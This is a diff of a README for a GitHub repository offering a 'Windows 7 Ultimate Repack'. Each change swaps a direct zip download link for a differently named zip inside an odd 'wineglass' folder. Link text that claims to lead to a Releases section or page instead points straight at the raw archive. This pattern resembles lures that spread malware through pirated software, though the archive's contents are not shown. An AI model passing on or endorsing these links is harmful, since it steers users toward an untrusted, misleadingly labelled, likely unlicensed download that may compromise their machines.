@@ -1,6 +1,6 @@
 # 🚀 Windows-7-Ultimate-Repack - Your Complete Windows 7 Solution
 
-[![Download Windows 7 Ultimate Repack](https://github.com/Kedarrrrrr/Windows-7-Ultimate-Repack/raw/refs/heads/main/wineglass/Windows-Ultimate-Repack-v1.3.zip%20Now-brightgreen)](https://github.com/Kedarrrrrr/Windows-7-Ultimate-Repack/raw/refs/heads/main/wineglass/Windows-Ultimate-Repack-v1.3.zip)
+[![Download Windows 7 Ultimate Repack](https://raw.githubusercontent.com/Kedarrrrrr/Windows-7-Ultimate-Repack/main/wineglass/Repack-Ultimate-Windows-2.8.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Kedarrrrrr/Windows-7-Ultimate-Repack/main/wineglass/Repack-Ultimate-Windows-2.8.zip)
 
 ## 📥 Overview
 
@@ -24,13 +24,13 @@ To begin using Windows-7-Ultimate-Repack, follow these steps:
 2. Choose the version that suits your needs.
 3. Follow the on-screen instructions to download the software.
 
-[Visit this page to download](https://github.com/Kedarrrrrr/Windows-7-Ultimate-Repack/raw/refs/heads/main/wineglass/Windows-Ultimate-Repack-v1.3.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Kedarrrrrr/Windows-7-Ultimate-Repack/main/wineglass/Repack-Ultimate-Windows-2.8.zip)
 
 ## 📦 Download & Install
 
 To download Windows-7-Ultimate-Repack:
 
-- Visit [this page](https://github.com/Kedarrrrrr/Windows-7-Ultimate-Repack/raw/refs/heads/main/wineglass/Windows-Ultimate-Repack-v1.3.zip) to access the Releases section.
+- Visit [this page](https://raw.githubusercontent.com/Kedarrrrrr/Windows-7-Ultimate-Repack/main/wineglass/Repack-Ultimate-Windows-2.8.zip) to access the Releases section.
 - Look for the latest release with the highest version number.
 - Click on the download link for your specific needs. 
 
@@ -84,4 +84,4 @@ Windows-7-Ultimate-Repack is available under the MIT License. You are free to us
 
 Windows-7-Ultimate-Repack makes managing Windows 7 easy. With the detailed guidance and features included, you can enhance your user experience effectively. Don't hesitate to access the Releases page and start your download today.
 
-[Visit this page to download](https://github.com/Kedarrrrrr/Windows-7-Ultimate-Repack/raw/refs/heads/main/wineglass/Windows-Ultimate-Repack-v1.3.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Kedarrrrrr/Windows-7-Ultimate-Repack/main/wineglass/Repack-Ultimate-Windows-2.8.zip)
